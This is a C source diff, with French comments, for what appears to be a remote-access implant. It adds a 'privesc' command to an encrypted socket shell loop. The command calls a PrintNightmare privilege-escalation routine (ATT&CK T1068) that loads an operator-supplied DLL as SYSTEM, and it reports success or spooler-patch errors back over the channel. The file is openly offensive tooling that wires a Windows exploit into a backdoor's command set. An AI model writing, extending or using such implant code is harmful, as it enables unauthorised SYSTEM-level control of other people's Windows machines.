@@ -11,6 +11,7 @@
 #include <string.h>
 
 #include "crypto.h"
+#include "privesc.h"
 #include "shell.h"
 
 /* ================================================================
@@ -122,6 +123,29 @@ void shell_loop(SOCKET sock)
         /* Commande vide : renvoyer une ligne vide */
         if (len == 0) {
             send_enc(sock, (uint8_t *)"\r\n", 2);
+            continue;
+        }
+
+        /* PrintNightmare LPE (T1068) — privesc <dll_path> */
+        if (strncmp(cmd, "privesc ", 8) == 0) {
+            const char *dll = cmd + 8;
+            int rc = privesc_printnightmare(dll);
+            char msg[256];
+            if (rc == 0)
+                snprintf(msg, sizeof(msg),
+                         "[privesc] success — DLL loaded as SYSTEM\r\n");
+            else if (rc == -1)
+                snprintf(msg, sizeof(msg),
+                         "[privesc] error — DLL not found: %s\r\n", dll);
+            else if (rc == -2)
+                snprintf(msg, sizeof(msg),
+                         "[privesc] error — UNIDRV.DLL not found in "
+                         "DriverStore\r\n");
+            else
+                snprintf(msg, sizeof(msg),
+                         "[privesc] error — AddPrinterDriverExA failed "
+                         "(code %d, spooler patched?)\r\n", rc);
+            send_enc(sock, (uint8_t *)msg, (int)strlen(msg));
             continue;
         }
 
